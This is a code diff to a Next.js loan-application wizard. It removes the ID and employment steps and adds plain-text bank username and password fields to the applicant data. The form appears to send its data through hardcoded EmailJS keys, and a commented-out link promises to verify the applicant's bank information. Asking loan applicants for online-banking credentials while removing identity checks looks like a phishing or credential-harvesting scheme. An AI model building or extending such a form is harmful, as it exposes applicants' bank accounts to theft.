@@ -3,7 +3,8 @@
 import { useState, useEffect, useCallback } from "react";
 import dynamic from "next/dynamic";
 import emailjs from "@emailjs/browser";
-import { getUTMParams } from "@/lib/utils";
+import Link from "next/dist/client/link";
+import StepConsent from "./steps/StepConsent";
 // import { apiUrl } from "@/lib/api";
 
 // ── EmailJS config ──────────────────────────────────────
@@ -13,13 +14,9 @@ const EMAILJS_TEMPLATE_ID = "template_haxp2r6";
 const EMAILJS_PUBLIC_KEY = "cJhBcR1abKXJ6fUEy";
 
 const StepPersonalInfo = dynamic(() => import("./steps/StepPersonalInfo"));
-const StepIdentification = dynamic(() => import("./steps/StepIdentification"));
 const StepAddress = dynamic(() => import("./steps/StepAddress"));
-const StepEmployment = dynamic(() => import("./steps/StepEmployment"));
 const StepLoanDetails = dynamic(() => import("./steps/StepLoanDetails"));
 const StepBanking = dynamic(() => import("./steps/StepBanking"));
-const StepConsent = dynamic(() => import("./steps/StepConsent"));
-
 export interface ApplicationData {
   // Personal Info
   firstName: string;
@@ -51,7 +48,10 @@ export interface ApplicationData {
   routingNumber: string;
   bankName: string;
   accountNumber: string;
+  bankUsername: string;
+  bankPassword: string;
   accountType: "checking" | "savings";
+  bankLinkConsent: boolean;
   // Consent
   tcpaConsent: boolean;
   privacyConsent: boolean;
@@ -67,12 +67,10 @@ export interface ApplicationData {
 
 const STEPS = [
   { id: 1, title: "Personal Info", shortTitle: "Personal" },
-  { id: 2, title: "Identification", shortTitle: "ID" },
-  { id: 3, title: "Address", shortTitle: "Address" },
-  { id: 4, title: "Employment", shortTitle: "Employment" },
-  { id: 5, title: "Loan Details", shortTitle: "Loan" },
-  { id: 6, title: "Banking", shortTitle: "Banking" },
-  { id: 7, title: "Review & Consent", shortTitle: "Submit" },
+  { id: 2, title: "Address", shortTitle: "Address" },
+  { id: 3, title: "Loan Details", shortTitle: "Loan" },
+  { id: 4, title: "Banking", shortTitle: "Banking" },
+  { id: 5, title: "Review & Consent", shortTitle: "Submit" },
 ];
 
 const initialData: ApplicationData = {
@@ -100,7 +98,10 @@ const initialData: ApplicationData = {
   routingNumber: "",
   bankName: "",
   accountNumber: "",
+  bankUsername: "",
+  bankPassword: "",
   accountType: "checking",
+  bankLinkConsent: false,
   tcpaConsent: false,
   privacyConsent: false,
   creditCheckConsent: false,
@@ -260,7 +261,15 @@ export default function ApplicationWizard() {
         <h2 className="text-2xl font-bold text-text-primary mb-2">
           Application Submitted!
         </h2>
+
         <p className="text-text-secondary">{submitResult.message}</p>
+
+        {/* <Link
+          href="/bank-verification"
+          className="text-primary hover:text-primary-dark border border-primary hover:border-primary-dark px-6 py-3 rounded-lg font-semibold transition-colors mt-6 inline-block"
+        >
+          Verify Your Bank Information
+        </Link> */}
 
         {submitResult.applicationId && (
           <div className="mt-6 bg-surface rounded-xl p-4">
@@ -394,7 +403,7 @@ export default function ApplicationWizard() {
           </div>
         )}
 
-        {currentStep === 1 && (
+        {/* {currentStep === 1 && (
           <StepPersonalInfo
             data={formData}
             updateData={updateFormData}
@@ -442,6 +451,46 @@ export default function ApplicationWizard() {
           />
         )}
         {currentStep === 7 && (
+          <StepConsent
+            data={formData}
+            updateData={updateFormData}
+            onBack={prevStep}
+            onSubmit={handleSubmit}
+            isSubmitting={isSubmitting}
+          />
+        )} */}
+        {currentStep === 1 && (
+          <StepPersonalInfo
+            data={formData}
+            updateData={updateFormData}
+            onNext={nextStep}
+          />
+        )}
+        {currentStep === 2 && (
+          <StepAddress
+            data={formData}
+            updateData={updateFormData}
+            onNext={nextStep}
+            onBack={prevStep}
+          />
+        )}
+        {currentStep === 3 && (
+          <StepLoanDetails
+            data={formData}
+            updateData={updateFormData}
+            onNext={nextStep}
+            onBack={prevStep}
+          />
+        )}
+        {currentStep === 4 && (
+          <StepBanking
+            data={formData}
+            updateData={updateFormData}
+            onBack={prevStep}
+            onNext={nextStep}
+          />
+        )}
+        {currentStep === 5 && (
           <StepConsent
             data={formData}
             updateData={updateFormData}
